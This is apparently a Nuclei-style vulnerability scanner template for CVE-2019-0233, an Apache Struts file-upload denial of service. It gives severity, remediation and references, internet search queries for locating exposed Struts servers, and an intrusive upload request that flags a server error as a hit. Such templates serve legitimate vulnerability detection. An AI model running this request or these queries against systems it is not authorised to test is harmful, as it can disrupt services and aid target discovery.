id: CVE-2019-0233

info:
  name: Apache Struts File Upload DoS
  author: ProjectDiscoveryAI
  severity: high
  description: An access permission override in Apache Struts 2.0.0 to 2.5.20 may cause a Denial of Service when performing a file upload.
  impact: |
    Successful exploitation can lead to service disruption and availability issues
  remediation: |
    Apply the necessary security patches provided by Apache Struts to mitigate the vulnerability
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-0233
    - https://launchpad.support.sap.com/#/notes/2982840
    - https://github.com/IkerSaint/VULNAPP-vulnerable-app
    - https://github.com/pctF/vulnerable-app
    - https://github.com/ARPSyndicate/cvemon
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    cvss-score: 7.5
    cve-id: CVE-2019-0233
    cwe-id: CWE-281
    epss-score: 0.09793
    epss-percentile: 0.9506
    cpe: cpe:2.3:a:apache:struts:*:*:*:*:*:*:*:*
  metadata:
    vendor: apache
    product: struts
    shodan-query: html:"Struts Problem Report"
    fofa-query: title="Struts2 Showcase"
    google-query: intitle:"struts2 showcase"
  tags: intrusive

http:
  - method: POST
    path:
      - "{{BaseURL}}/upload.action"

    headers:
      Content-Type: multipart/form-data

    body: |
      ------WebKitFormBoundary
      Content-Disposition: form-data; name="upload"; filename="test.txt"
      Content-Type: text/plain

      test data
      ------WebKitFormBoundary--
    matchers:
      - type: status
        status:
          - 500

      - type: word
        words:
          - "Internal Server Error"
        part: body
